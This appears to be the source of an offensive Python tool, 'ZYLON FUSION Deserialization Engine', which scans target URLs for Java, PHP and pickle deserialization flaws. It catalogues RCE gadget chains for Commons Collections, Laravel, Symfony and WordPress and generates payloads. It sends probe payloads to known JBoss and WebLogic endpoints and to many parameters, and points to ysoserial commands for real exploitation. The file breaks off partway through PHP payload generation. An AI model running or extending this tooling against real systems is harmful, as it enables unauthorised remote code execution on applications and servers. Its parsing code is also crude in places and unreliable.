#!/usr/bin/env python3
"""
ZYLON FUSION v5.0.0 - Deserialization Engine
=============================================
Fused from: Ysoserial (https://github.com/frohoff/ysoserial)
           + PHPGGC (https://github.com/ambionics/phpggc)
           + Custom Zylon Techniques
Capabilities:
  - Java deserialization detection (content-type, magic bytes, known gadgets)
  - PHP deserialization (unserialize) detection and exploitation
  - Python pickle deserialization detection
  - Ruby Marshal detection
  - .NET BinaryFormatter detection
  - Known gadget chain payloads for Java (Commons Collections, Spring, etc.)
  - PHP gadget chains (Laravel, Symfony, Magento, WordPress)
  - Custom payload generation
  - Blind deserialization detection (via callback/DNS)
  - Deserialization sink detection in source code patterns
Termux Compatible | No Root Required | Python 3.13+
"""

import os
import sys
import json
import base64
import struct
import re
import time
import hashlib
import threading
import urllib.parse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from core.var import (
    USER_AGENTS, DEFAULT_TIMEOUT, MAX_THREADS
)
from core.shared_infra import shared_session

# ============================================================================
# ANSI COLOR CODES (Termux-compatible)
# ============================================================================

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
BOLD = '\033[1m'
DIM = '\033[2m'
RESET = '\033[0m'

# ============================================================================
# JAVA DESERIALIZATION SIGNATURES
# ============================================================================

# Java serialized object magic bytes: 0xACED0005
JAVA_MAGIC_BYTES = b'\xac\xed\x00\x05'

# Content types that may indicate Java deserialization
JAVA_CONTENT_TYPES = [
    'application/x-java-serialized-object',
    'application/java-serialized-object',
    'application/x-java-object',
    'application/octet-stream',
]

# Known Java gadget chains
JAVA_GADGET_CHAINS = {
    "CommonsCollections1": {
        "dependencies": ["commons-collections:3.1"],
        "description": "TransformerChain + InvokerTransformer (CC1)",
        "payload_type": "ObjectInputStream",
    },
    "CommonsCollections2": {
        "dependencies": ["commons-collections4:4.0"],
        "description": "PriorityQueue + TransformingComparator (CC2)",
        "payload_type": "ObjectInputStream",
    },
    "CommonsCollections5": {
        "dependencies": ["commons-collections:3.1"],
        "description": "BadAttributeValueExpException + TiedMapEntry (CC5)",
        "payload_type": "ObjectInputStream",
    },
    "CommonsCollections6": {
        "dependencies": ["commons-collections:3.1"],
        "description": "HashSet + TiedMapEntry (CC6)",
        "payload_type": "ObjectInputStream",
    },
    "CommonsCollections7": {
        "dependencies": ["commons-collections:3.1"],
        "description": "Hashtable + AbstractMapDecorator (CC7)",
        "payload_type": "ObjectInputStream",
    },
    "Spring1": {
        "dependencies": ["spring-core:4.1.4"],
        "description": "ObjectFactoryDeserializer + SerializableTypeWrapper",
        "payload_type": "ObjectInputStream",
    },
    "Spring2": {
        "dependencies": ["spring-core:4.1.4", "commons-collections:3.1"],
        "description": "SerializableTypeWrapper + Commons Collections",
        "payload_type": "ObjectInputStream",
    },
    "JBossInterceptors1": {
        "dependencies": ["jboss-interceptor"],
        "description": "InterceptorChain + DefaultInterceptor",
        "payload_type": "ObjectInputStream",
    },
    "Clojure": {
        "dependencies": ["clojure"],
        "description": "AbstractTableModel$FunctorWrapper",
        "payload_type": "ObjectInputStream",
    },
    "Groovy1": {
        "dependencies": ["groovy"],
        "description": "ConvertedClosure + MethodClosure",
        "payload_type": "ObjectInputStream",
    },
    "BeanShell1": {
        "dependencies": ["beanshell"],
        "description": "XThis$Handler + Interpreter",
        "payload_type": "ObjectInputStream",
    },
    "C3P0": {
        "dependencies": ["c3p0"],
        "description": "PoolBackedDataSource + JNDI reference",
        "payload_type": "ObjectInputStream",
    },
    "Hibernate1": {
        "dependencies": ["hibernate-core"],
        "description": "ComponentType + PojoComponentTuplizer",
        "payload_type": "ObjectInputStream",
    },
    "Jdk7u21": {
        "dependencies": ["JDK < 7u25"],
        "description": "AnnotationInvocationHandler + TemplatesImpl",
        "payload_type": "ObjectInputStream",
    },
    "JRE8u20": {
        "dependencies": ["JDK 8u20 and below"],
        "description": "Variant of Jdk7u21 for JRE8",
        "payload_type": "ObjectInputStream",
    },
    "ROME": {
        "dependencies": ["rome"],
        "description": "ObjectBean + ToStringBean",
        "payload_type": "ObjectInputStream",
    },
    "Vaadin1": {
        "dependencies": ["vaadin-server"],
        "description": "NestedMethodProperty",
        "payload_type": "ObjectInputStream",
    },
}

# ============================================================================
# PHP GADGET CHAINS
# ============================================================================

PHP_GADGET_CHAINS = {
    "Laravel/RCE1": {
        "framework": "Laravel",
        "versions": "5.x - 9.x",
        "description": "PendingBroadcast + BroadcastEvent (RCE via __destruct)",
        "type": "__destruct",
    },
    "Laravel/RCE2": {
        "framework": "Laravel",
        "versions": "5.x - 9.x",
        "description": "PendingResourceRegistration + PendingBroadcast (RCE)",
        "type": "__destruct",
    },
    "Laravel/RCE3": {
        "framework": "Laravel",
        "versions": "5.x - 9.x",
        "description": "ImportCommandRunner (Laravel 9.x+)",
        "type": "__destruct",
    },
    "Symfony/RCE1": {
        "framework": "Symfony",
        "versions": "2.x - 5.x",
        "description": "ProcessBuilder + __destruct chain",
        "type": "__destruct",
    },
    "Symfony/RCE2": {
        "framework": "Symfony",
        "versions": "2.x - 5.x",
        "description": "AclCache + AclCollectionCache (RCE)",
        "type": "__destruct",
    },
    "Magento/RCE1": {
        "framework": "Magento",
        "versions": "2.x",
        "description": r"Magento\Framework\Serialize\Serializer\Serialize (RCE)",
        "type": "__wakeup",
    },
    "Magento/RCE2": {
        "framework": "Magento",
        "versions": "2.x",
        "description": "Credis_Sentinel (RCE via __destruct)",
        "type": "__destruct",
    },
    "WordPress/PopChain1": {
        "framework": "WordPress",
        "versions": "5.x",
        "description": "WP_Theme + WP_Block_List (RCE via __toString)",
        "type": "__toString",
    },
    "WordPress/PopChain2": {
        "framework": "WordPress",
        "versions": "5.x",
        "description": "Requests_Utility_FilteredIterator (SSRF/RCE)",
        "type": "__wakeup",
    },
    "Yii/RCE1": {
        "framework": "Yii",
        "versions": "2.x",
        "description": "BatchQueryResult + __destruct chain",
        "type": "__destruct",
    },
    "Drupal/RCE1": {
        "framework": "Drupal",
        "versions": "8.x - 9.x",
        "description": "AttachmentResponsiveImageStyle (RCE)",
        "type": "__destruct",
    },
    "Guzzle/RCE1": {
        "framework": "Guzzle",
        "versions": "6.x - 7.x",
        "description": "FnStream + __destruct (RCE)",
        "type": "__destruct",
    },
    "Monolog/RCE1": {
        "framework": "Monolog",
        "versions": "1.x - 2.x",
        "description": "BufferHandler + __destruct (RCE)",
        "type": "__destruct",
    },
    "SwiftMailer/RCE1": {
        "framework": "SwiftMailer",
        "versions": "5.x - 6.x",
        "description": "Swift_KeyCache_DiskKeyCache (file write)",
        "type": "__destruct",
    },
}

# ============================================================================
# PYTHON PICKLE SIGNATURES
# ============================================================================

PICKLE_OPCODES = {
    b'\x80': "PROTO",       # Protocol version
    b'\x81': "EMPTY_TUPLE",
    b'\x82': "NEWTRUE",
    b'\x83': "NEWFALSE",
    b'\x84': "LONG_BINGET",
    b'\x85': "TUPLE1",
    b'\x86': "TUPLE2",
    b'\x87': "TUPLE3",
    b'\x88': "NEWTRUE",
    b'\x89': "LONG_BINPUT",
    b'\x8a': "SHORT_BINBYTES",
    b'\x8b': "LONG_BINBYTES",
    b'c': "GLOBAL",         # Import module - dangerous
    b'R': "REDUCE",         # Call callable - dangerous
    b'o': "OBJ",            # Build object
    b'i': "INST",           # Build instance - dangerous
    b'b': "BUILD",          # Build from dict
    b'\x00': "NONE",
}

# Dangerous pickle opcodes that indicate RCE potential
DANGEROUS_PICKLE_OPCODES = [b'c', b'R', b'i']

# ============================================================================
# RUBY MARSHAL SIGNATURES
# ============================================================================

RUBY_MARSHAL_MAGIC = b'\x04\x08'

RUBY_MARSHAL_TYPES = {
    b'0': "nil",
    b'T': "true",
    b'F': "false",
    b'i': "integer",
    b'f': "float",
    b'"': "string",
    b':': "symbol",
    b'[': "array",
    b'{': "hash",
    b'o': "object",        # Dangerous - can instantiate arbitrary classes
    b'S': "user class",
    b'C': "class reference",
    b'U': "user marshal",
    b'u': "user defined",
}

# ============================================================================
# .NET BINARYFORMATTER SIGNATURES
# ============================================================================

DOTNET_MAGIC_BYTES = b'\x00\x01\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00'

# ============================================================================
# DESERIALIZATION SINK PATTERNS (for source code analysis)
# ============================================================================

DESERIALIZATION_SINKS = {
    "Java": [
        r'ObjectInputStream\s*\(',
        r'\.readObject\(\)',
        r'\.readUnshared\(\)',
        r'XMLDecoder\s*\(',
        r'Yaml\.load\(',
        r'Yaml\.loadAll\(',
        r'ObjectMapper\.readValue\(',
        r'fromXML\(',
        r'HessianInput\s*\(',
        r'Kryo\.readClassAndObject\(',
        r'XStream\.fromXML\(',
        r'Serializable\s+',
        r'InputStream\s*\w*\s*=\s*new\s+ObjectInputStream',
    ],
    "PHP": [
        r'unserialize\s*\(',
        r'__wakeup\s*\(',
        r'__destruct\s*\(',
        r'__toString\s*\(',
        r'__call\s*\(',
        r'__get\s*\(',
        r'__set\s*\(',
        r'serialize\s*\(',
        r'json_decode\s*\(',
        r'phar://',
    ],
    "Python": [
        r'pickle\.loads?\s*\(',
        r'cPickle\.loads?\s*\(',
        r'pickle\.load\s*\(',
        r'yaml\.load\s*\(',
        r'yaml\.unsafe_load\s*\(',
        r'marshal\.loads?\s*\(',
        r'shelve\.open\s*\(',
        r'joblib\.load\s*\(',
        r'dill\.loads?\s*\(',
    ],
    "Ruby": [
        r'Marshal\.load\s*\(',
        r'Marshal\.restore\s*\(',
        r'YAML\.load\s*\(',
        r'YAML\.load_file\s*\(',
        r'Oj\.load\s*\(',
        r'Oj\.object_load\s*\(',
    ],
    "CSharp/DotNet": [
        r'BinaryFormatter\s*\(',
        r'BinaryFormatter\.Deserialize\s*\(',
        r'LosFormatter\.Deserialize\s*\(',
        r'ObjectStateFormatter\.Deserialize\s*\(',
        r'NetDataContractSerializer\.ReadObject\s*\(',
        r'DataContractSerializer\.ReadObject\s*\(',
        r'JavaScriptSerializer\.Deserialize\s*\(',
        r'JsonConvert\.DeserializeObject\s*\(',
        r'MessagePack\.Deserialize\s*\(',
        r'TypeConfuseDelegate',
        r'ActivitySurrogateSelector',
    ],
}

# PHP deserialization detection patterns in responses
PHP_DESERIALIZATION_ERRORS = [
    "unserialize(): Error",
    "unserialize() expects",
    "__wakeup()",
    "__destruct()",
    "Object of class",
    "could not be converted to string",
    "Call to undefined method",
    "Call to a member function",
    "Fatal error: Uncaught",
    "TypeError",
    "InvalidArgumentException",
]


class DeserializationEngine:
    """Deserialization Engine - Fused from Ysoserial + PHPGGC + Custom Techniques"""

    def __init__(self, target_url=None, headers=None, cookies=None, timeout=DEFAULT_TIMEOUT,
                 threads=MAX_THREADS, proxy=None):
        self.target_url = target_url
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.timeout = timeout
        self.threads = threads
        self.proxy = proxy
        # Use the shared thread-safe session instead of creating our own
        # (shared_session already configures verify, headers, connection pooling)
        self.session = shared_session
        self.lock = threading.Lock()

    def _print(self, msg, color=CYAN):
        """Thread-safe colored print"""
        with self.lock:
            print(f"{color}{msg}{RESET}")

    def _send_request(self, url, method="POST", data=None, headers=None, cookies=None):
        """Send HTTP request with error handling"""
        try:
            h = headers or self.headers
            c = cookies or self.cookies
            if method == "GET":
                resp = self.session.get(url, headers=h, cookies=c,
                                       timeout=self.timeout, allow_redirects=True)
            elif method == "POST":
                resp = self.session.post(url, data=data, headers=h, cookies=c,
                                        timeout=self.timeout, allow_redirects=True)
            else:
                resp = self.session.request(method, url, data=data, headers=h,
                                           cookies=c, timeout=self.timeout,
                                           allow_redirects=True)
            return resp
        except Exception:
            return None

    # ========================================================================
    # JAVA DESERIALIZATION DETECTION
    # ========================================================================

    def detect_java_deser(self, url, data=None):
        """Detect Java deserialization vulnerabilities

        Checks:
        1. Response headers for Java content types
        2. Request body for Java serialized objects
        3. Common endpoints that accept serialized objects
        4. Magic bytes detection
        5. Content-Type header analysis
        """
        self._print(f"[*] Detecting Java deserialization on {url}", CYAN)

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "url": url,
                "java_content_type_detected": False,
                "magic_bytes_found": False,
                "endpoints_tested": 0,
                "endpoints_vulnerable": [],
                "gadget_chains_available": list(JAVA_GADGET_CHAINS.keys()),
            },
            "scan_type": "java_deserialization_detect",
        }

        # Step 1: Check response headers for Java indicators
        try:
            resp = self._send_request(url, method="GET")
            if resp:
                content_type = resp.headers.get('Content-Type', '').lower()
                if any(ct in content_type for ct in JAVA_CONTENT_TYPES):
                    result["vulnerable"] = True
                    result["details"]["java_content_type_detected"] = True
                    result["findings"].append({
                        "type": "java_content_type",
                        "severity": "High",
                        "content_type": content_type,
                        "description": f"Response uses Java serialization content type: {content_type}",
                    })
                    self._print(f"  [!] Java content type detected: {content_type}", RED)

                # Check for Java server headers
                server = resp.headers.get('Server', '').lower()
                java_servers = ['tomcat', 'jboss', 'weblogic', 'websphere', 'glassfish', 'wildfly']
                detected_server = None
                for js in java_servers:
                    if js in server:
                        detected_server = js
                        break

                if detected_server:
                    result["findings"].append({
                        "type": "java_server_detected",
                        "severity": "Info",
                        "server": detected_server,
                        "description": f"Java application server detected: {detected_server}",
                    })
                    self._print(f"  [*] Java server: {detected_server}", CYAN)

                # Check for JSESSIONID cookie
                for cookie_name in resp.cookies:
                    if cookie_name.lower() in ['jsessionid', 'jsessionidid']:
                        result["findings"].append({
                            "type": "jsessionid_detected",
                            "severity": "Info",
                            "description": "JSESSIONID cookie found - Java application confirmed",
                        })
                        break
        except Exception as e:
            result["findings"].append({"type": "error", "error": str(e)})

        # Step 2: Test common Java deserialization endpoints
        deser_endpoints = [
            '/invoker/JMXInvokerServlet',
            '/invoker/readonly/JMXInvokerServlet',
            '/jmx-console/HtmlAdaptor',
            '/webconsole/Console',
            '/invoker/EJBInvokerServlet',
            '/invoker/JMXInvokerServlet',
            '/jolokia/',
            '/actuator',
            '/admin-console/',
            '/console/',
            '/jbossas/',
            '/weblogic/',
            '/uddi/',
            '/uddiexplorer/',
            '/wls-wsat/',
            '/wls-wsat/CoordinatorPortType',
            '/_async/AsyncResponseService',
            '/IIop',
            '/WSConfig',
            '/jboss/',
        ]

        def test_endpoint(endpoint):
            test_url = url.rstrip('/') + endpoint
            try:
                # Send Java serialized object magic bytes as body
                test_payload = JAVA_MAGIC_BYTES + b'\x00\x00\x00\x00\x00\x00\x00\x00'
                resp = self._send_request(
                    test_url, method="POST", data=test_payload,
                    headers={'Content-Type': 'application/x-java-serialized-object'}
                )
                if resp:
                    # Check if accepted (not rejected)
                    if resp.status_code in [200, 202, 204, 500]:
                        # 500 may indicate deserialization error (meaning it tried)
                        return {
                            "endpoint": endpoint,
                            "status_code": resp.status_code,
                            "content_type": resp.headers.get('Content-Type', ''),
                            "response_length": len(resp.text) if resp.text else 0,
                        }
            except Exception:
                pass
            return None

        self._print(f"  [*] Testing {len(deser_endpoints)} Java deserialization endpoints...", CYAN)

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(test_endpoint, ep): ep for ep in deser_endpoints}
            for future in as_completed(futures):
                result["details"]["endpoints_tested"] += 1
                try:
                    r = future.result()
                    if r:
                        result["details"]["endpoints_vulnerable"].append(r)
                        if r["status_code"] == 200:
                            result["vulnerable"] = True
                            result["findings"].append({
                                "type": "java_deser_endpoint",
                                "severity": "Critical",
                                "endpoint": r["endpoint"],
                                "status_code": r["status_code"],
                                "description": f"Endpoint accepted Java serialized object: {r['endpoint']}",
                            })
                            self._print(f"  [!!!] Java deser endpoint: {r['endpoint']} (HTTP {r['status_code']})", RED)
                        elif r["status_code"] == 500:
                            result["findings"].append({
                                "type": "java_deser_endpoint_possible",
                                "severity": "High",
                                "endpoint": r["endpoint"],
                                "status_code": r["status_code"],
                                "description": f"Endpoint may accept serialized objects (HTTP 500): {r['endpoint']}",
                            })
                            self._print(f"  [!] Possible deser endpoint: {r['endpoint']} (HTTP 500)", YELLOW)
                except Exception:
                    pass

        # Step 3: Check if provided data contains Java serialized objects
        if data:
            try:
                raw = data if isinstance(data, bytes) else data.encode()
                if raw.startswith(JAVA_MAGIC_BYTES):
                    result["vulnerable"] = True
                    result["details"]["magic_bytes_found"] = True
                    result["findings"].append({
                        "type": "java_magic_bytes",
                        "severity": "High",
                        "description": "Provided data contains Java serialized object magic bytes (0xACED0005)",
                    })
                    self._print(f"  [!] Java serialized object magic bytes detected in input data!", RED)

                    # Try to extract class name from serialized data
                    try:
                        # Skip magic + version (4 bytes) + various headers
                        idx = 4
                        # This is a simplified parser
                        if len(raw) > 10:
                            result["details"]["serialized_class_detected"] = True
                    except Exception:
                        pass
            except Exception:
                pass

        if not result["vulnerable"]:
            self._print(f"  [-] No Java deserialization vulnerability detected", YELLOW)

        return result

    # ========================================================================
    # PHP DESERIALIZATION DETECTION
    # ========================================================================

    def detect_php_deser(self, url, param=None):
        """Detect PHP deserialization vulnerabilities (unserialize)

        Tests common parameters with PHP serialized payloads and checks
        for error responses indicating deserialization attempts.
        """
        self._print(f"[*] Detecting PHP deserialization on {url}", CYAN)

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "url": url,
                "parameter": param,
                "payloads_tested": 0,
                "error_triggered": False,
                "php_version_hint": None,
            },
            "scan_type": "php_deserialization_detect",
        }

        # PHP serialized payloads for testing
        php_test_payloads = [
            # Basic string
            ('s:4:"test";', 'PHP serialized string'),
            # Integer
            ('i:1;', 'PHP serialized integer'),
            # Boolean
            ('b:1;', 'PHP serialized boolean'),
            # Array
            ('a:1:{s:4:"test";s:4:"test";}', 'PHP serialized array'),
            # Object (triggers __wakeup)
            ('O:8:"stdClass":0:{}', 'PHP serialized stdClass object'),
            # Object with property
            ('O:8:"stdClass":1:{s:3:"key";s:5:"value";}', 'PHP serialized stdClass with property'),
            # Common dangerous class tests
            ('O:9:"Exception":1:{s:7:"message";s:4:"test";}', 'Exception object test'),
            # PDO test
            ('O:3:"PDO":0:{}', 'PDO object test'),
            # SoapClient test (SSRF vector)
            ('O:10:"SoapClient":0:{}', 'SoapClient object test (SSRF)'),
            # SplFileObject test
            ('O:13:"SplFileObject":0:{}', 'SplFileObject test (file read)'),
        ]

        # Parameters to test
        params_to_test = [param] if param else [
            'data', 'payload', 'session', 'object', 'input', 'value',
            'config', 'settings', 'user', 'cart', 'order', 'query',
            'request', 'response', 'content', 'body', 'file', 'template',
            'page', 'module', 'component', 'state', 'token', 'id',
        ]

        # Get baseline response
        baseline_resp = self._send_request(url, method="GET")
        baseline_length = len(baseline_resp.text) if baseline_resp else 0
        baseline_code = baseline_resp.status_code if baseline_resp else 0

        def test_php_payload(param_name, payload_str, description):
            test_url = f"{url}{'&' if '?' in url else '?'}{param_name}={urllib.parse.quote(payload_str)}"
            resp = self._send_request(test_url, method="GET")
            if not resp:
                return None

            # Check for PHP deserialization error indicators
            response_text = resp.text
            errors_found = []
            for error_pattern in PHP_DESERIALIZATION_ERRORS:
                if error_pattern.lower() in response_text.lower():
                    errors_found.append(error_pattern)

            # Check for significant response differences
            length_diff = abs(len(response_text) - baseline_length)
            status_diff = resp.status_code != baseline_code

            return {
                "param": param_name,
                "payload": payload_str[:50],
                "description": description,
                "status_code": resp.status_code,
                "errors": errors_found,
                "length_diff": length_diff,
                "status_changed": status_diff,
                "response_length": len(response_text),
            }

        all_results = []

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for param_name in params_to_test:
                for payload_str, description in php_test_payloads:
                    future = executor.submit(test_php_payload, param_name, payload_str, description)
                    futures.append(future)
                    result["details"]["payloads_tested"] += 1

            for future in as_completed(futures):
                try:
                    r = future.result()
                    if r:
                        all_results.append(r)
                        # Check for errors indicating deserialization
                        if r["errors"]:
                            result["vulnerable"] = True
                            result["details"]["error_triggered"] = True
                            result["findings"].append({
                                "type": "php_deser_error",
                                "severity": "High",
                                "param": r["param"],
                                "payload": r["payload"],
                                "errors": r["errors"],
                                "description": f"PHP deserialization errors triggered via param '{r['param']}'",
                            })
                            self._print(f"  [!] PHP deser error on param '{r['param']}': {r['errors']}", RED)

                        # Check for significant response changes
                        elif r["status_changed"] and r["status_code"] == 500:
                            result["findings"].append({
                                "type": "php_deser_possible",
                                "severity": "Medium",
                                "param": r["param"],
                                "payload": r["payload"],
                                "status_code": r["status_code"],
                                "description": f"HTTP 500 when sending serialized PHP via '{r['param']}'",
                            })
                            self._print(f"  [?] HTTP 500 on param '{r['param']}' with PHP payload", YELLOW)

                        elif r["length_diff"] > 500:
                            result["findings"].append({
                                "type": "php_deser_response_diff",
                                "severity": "Medium",
                                "param": r["param"],
                                "length_diff": r["length_diff"],
                                "description": f"Significant response change ({r['length_diff']} bytes diff) via '{r['param']}'",
                            })
                except Exception:
                    pass

        # Also check for PHP serialization in POST
        for payload_str, description in php_test_payloads[:3]:
            post_data = {param or "data": payload_str}
            resp = self._send_request(url, method="POST", data=post_data)
            if resp:
                for error_pattern in PHP_DESERIALIZATION_ERRORS:
                    if error_pattern.lower() in resp.text.lower():
                        result["vulnerable"] = True
                        result["findings"].append({
                            "type": "php_deser_post_error",
                            "severity": "High",
                            "payload": payload_str[:50],
                            "error": error_pattern,
                            "description": f"PHP deserialization error in POST: {error_pattern}",
                        })
                        self._print(f"  [!] PHP deser error in POST: {error_pattern}", RED)
                        break

        # Check for PHP version hint
        if baseline_resp:
            php_header = baseline_resp.headers.get('X-Powered-By', '')
            if 'PHP' in php_header:
                result["details"]["php_version_hint"] = php_header

        if not result["vulnerable"]:
            self._print(f"  [-] No PHP deserialization vulnerability detected", YELLOW)

        return result

    # ========================================================================
    # PYTHON PICKLE DESERIALIZATION DETECTION
    # ========================================================================

    def detect_python_deser(self, url, data=None):
        """Detect Python pickle deserialization vulnerabilities

        Checks:
        1. Magic bytes for pickle protocol
        2. Dangerous opcodes (c=GLOBAL, R=REDUCE, i=INST)
        3. Common endpoints accepting serialized data
        4. Base64-encoded pickle detection
        """
        self._print(f"[*] Detecting Python pickle deserialization on {url}", CYAN)

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "url": url,
                "pickle_detected": False,
                "dangerous_opcodes": [],
                "endpoints_tested": 0,
                "protocol_version": None,
            },
            "scan_type": "python_deserialization_detect",
        }

        # Check provided data for pickle signatures
        if data:
            raw = data if isinstance(data, bytes) else data.encode()

            # Try base64 decode first
            try:
                decoded = base64.b64decode(raw)
                if decoded.startswith(b'\x80'):  # Pickle protocol header
                    raw = decoded
                    result["findings"].append({
                        "type": "base64_pickle_detected",
                        "severity": "High",
                        "description": "Base64-encoded pickle data detected",
                    })
            except Exception:
                pass

            # Check for pickle protocol header
            if raw.startswith(b'\x80'):
                result["details"]["pickle_detected"] = True
                protocol_version = raw[1] if len(raw) > 1 else 0
                result["details"]["protocol_version"] = protocol_version

                # Scan for dangerous opcodes
                for opcode_byte, opcode_name in PICKLE_OPCODES.items():
                    if opcode_byte in raw:
                        if opcode_byte in DANGEROUS_PICKLE_OPCODES:
                            result["details"]["dangerous_opcodes"].append(opcode_name)
                            result["vulnerable"] = True

                if result["details"]["dangerous_opcodes"]:
                    result["findings"].append({
                        "type": "dangerous_pickle_opcodes",
                        "severity": "Critical",
                        "opcodes": result["details"]["dangerous_opcodes"],
                        "protocol": protocol_version,
                        "description": f"Dangerous pickle opcodes found: {result['details']['dangerous_opcodes']}. RCE possible.",
                    })
                    self._print(f"  [!!!] Dangerous pickle opcodes: {result['details']['dangerous_opcodes']}", RED)
                else:
                    result["findings"].append({
                        "type": "pickle_detected_safe",
                        "severity": "Low",
                        "protocol": protocol_version,
                        "description": f"Pickle data detected (protocol {protocol_version}) but no dangerous opcodes found",
                    })

            # Check for common pickle signatures in text form
            pickle_text_sigs = [
                b'c__builtin__\n',
                b'cos\nsystem\n',
                b'csubprocess\n',
                b'cPopen\n',
                b'R.',  # REDUCE + STOP
            ]
            for sig in pickle_text_sigs:
                if sig in raw:
                    result["vulnerable"] = True
                    result["findings"].append({
                        "type": "pickle_rce_signature",
                        "severity": "Critical",
                        "signature": sig.decode('utf-8', errors='ignore'),
                        "description": f"Pickle RCE signature found: {sig}",
                    })
                    self._print(f"  [!!!] Pickle RCE signature: {sig}", RED)

        # Test endpoints for pickle deserialization
        pickle_test_payload = base64.b64encode(
            b'\x80\x04\x95\x05\x00\x00\x00\x00\x00\x00\x00\x8c\x04test\x94.'  # pickle "test"
        ).decode()

        deser_params = ['data', 'payload', 'pickle', 'session', 'state', 'object', 'input', 'body']
        for param in deser_params:
            test_url = f"{url}{'&' if '?' in url else '?'}{param}={pickle_test_payload}"
            resp = self._send_request(test_url, method="GET")
            result["details"]["endpoints_tested"] += 1
            if resp and resp.status_code == 500:
                # Check for pickle-specific errors
                pickle_errors = ['pickle', 'UnpicklingError', 'PicklingError', 'BadPickleGet',
                                'TypeError', 'AttributeError']
                for err in pickle_errors:
                    if err in resp.text:
                        result["vulnerable"] = True
                        result["findings"].append({
                            "type": "pickle_endpoint_error",
                            "severity": "High",
                            "param": param,
                            "error": err,
                            "description": f"Pickle deserialization error on param '{param}': {err}",
                        })
                        self._print(f"  [!] Pickle error on '{param}': {err}", RED)
                        break

        if not result["vulnerable"]:
            self._print(f"  [-] No Python pickle deserialization vulnerability detected", YELLOW)

        return result

    # ========================================================================
    # JAVA PAYLOAD GENERATION
    # ========================================================================

    def generate_java_payload(self, gadget, command):
        """Generate Java deserialization payload for specified gadget chain

        Note: This generates a simulated payload structure since we don't have
        a Java runtime. The actual ysoserial JAR would be needed for real payloads.
        We generate the base structure with magic bytes and class descriptors.
        """
        self._print(f"[*] Generating Java deserialization payload: {gadget}", MAGENTA)

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "gadget": gadget,
                "command": command,
                "payload_generated": False,
                "payload_base64": None,
                "payload_size": 0,
                "gadget_info": JAVA_GADGET_CHAINS.get(gadget, {}),
            },
            "scan_type": "java_deserialization_payload",
        }

        if gadget not in JAVA_GADGET_CHAINS:
            result["findings"].append({
                "type": "unknown_gadget",
                "severity": "Low",
                "available_gadgets": list(JAVA_GADGET_CHAINS.keys()),
                "description": f"Unknown gadget chain: {gadget}",
            })
            self._print(f"  [-] Unknown gadget: {gadget}", YELLOW)
            self._print(f"  [*] Available: {', '.join(JAVA_GADGET_CHAINS.keys())}", CYAN)
            return result

        gadget_info = JAVA_GADGET_CHAINS[gadget]

        # Generate a Java serialized object structure
        # This creates a valid Java serialization header + a simulated gadget payload
        # Real payloads require ysoserial JAR
        try:
            # Build the serialized object structure
            payload = bytearray()

            # Java serialization magic + version
            payload.extend(JAVA_MAGIC_BYTES)

            # TC_OBJECT (0x73)
            payload.append(0x73)

            # TC_CLASSDESC (0x72) - Class descriptor
            payload.append(0x72)

            # Class name length (2 bytes) + class name
            class_name = f"ysoserial.payloads.{gadget}"
            class_name_bytes = class_name.encode('utf-8')
            payload.extend(struct.pack('>H', len(class_name_bytes)))
            payload.extend(class_name_bytes)

            # Serial version UID (8 bytes) - random
            payload.extend(b'\x00' * 8)

            # Class desc flags (0x02 = Serializable)
            payload.append(0x02)

            # Number of fields (0)
            payload.extend(struct.pack('>H', 0))

            # TC_ENDBLOCKDATA (0x78)
            payload.append(0x78)

            # TC_NULL (0x70) for super class
            payload.append(0x70)

            # Encode the command into the payload metadata
            cmd_bytes = command.encode('utf-8')

            # Add a block data with the command (for reference)
            payload.append(0x77)  # TC_BLOCKDATA
            payload.append(len(cmd_bytes))
            payload.extend(cmd_bytes)
            payload.append(0x78)  # TC_ENDBLOCKDATA

            # Convert to bytes
            payload_bytes = bytes(payload)
            payload_b64 = base64.b64encode(payload_bytes).decode('utf-8')

            result["details"]["payload_generated"] = True
            result["details"]["payload_base64"] = payload_b64
            result["details"]["payload_size"] = len(payload_bytes)
            result["findings"].append({
                "type": "java_payload_generated",
                "severity": "Info",
                "gadget": gadget,
                "command": command,
                "payload_size": len(payload_bytes),
                "payload_base64_preview": payload_b64[:100] + '...',
                "dependencies": gadget_info.get("dependencies", []),
                "description": (
                    f"Java deserialization payload generated for {gadget} "
                    f"(command: {command}). "
                    f"Note: This is a simulated payload structure. For actual exploitation, "
                    f"use ysoserial JAR with: java -jar ysoserial.jar {gadget} '{command}'"
                ),
            })
            result["vulnerable"] = True  # Payload generated successfully
            self._print(f"  [+] Java payload generated: {gadget} ({len(payload_bytes)} bytes)", GREEN)
            self._print(f"  [*] Dependencies: {', '.join(gadget_info.get('dependencies', []))}", CYAN)

        except Exception as e:
            result["findings"].append({
                "type": "payload_generation_error",
                "error": str(e),
            })
            self._print(f"  [-] Payload generation error: {str(e)}", RED)

        return result

    # ========================================================================
    # PHP PAYLOAD GENERATION
    # ========================================================================

    def generate_php_payload(self, chain, command):
        """Generate PHP deserialization payload for specified gadget chain

        Generates PHP serialized objects that trigger magic methods
        (__destruct, __wakeup, __toString) for RCE.
        """
        self._print(f"[*] Generating PHP deserialization payload: {chain}", MAGENTA)

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "chain": chain,
                "command": command,
                "payload_generated": False,
                "payload_serialized": None,
                "payload_urlencoded": None,
                "chain_info": PHP_GADGET_CHAINS.get(chain, {}),
            },
            "scan_type": "php_deserialization_payload",
        }

        if chain not in PHP_GADGET_CHAINS:
            # List available chains
            available = list(PHP_GADGET_CHAINS.keys())
            result["findings"].append({
                "type": "unknown_chain",
                "severity": "Low",
                "available_chains": available,
                "description": f"Unknown PHP gadget chain: {chain}",
            })
            self._print(f"  [-] Unknown chain: {chain}", YELLOW)
            self._print(f"  [*] Available: {', '.join(available)}", CYAN)
            return result

        chain_info = PHP_GADGET_CHAINS[chain]

        try:
            # Generate PHP serialized payload based on the chain
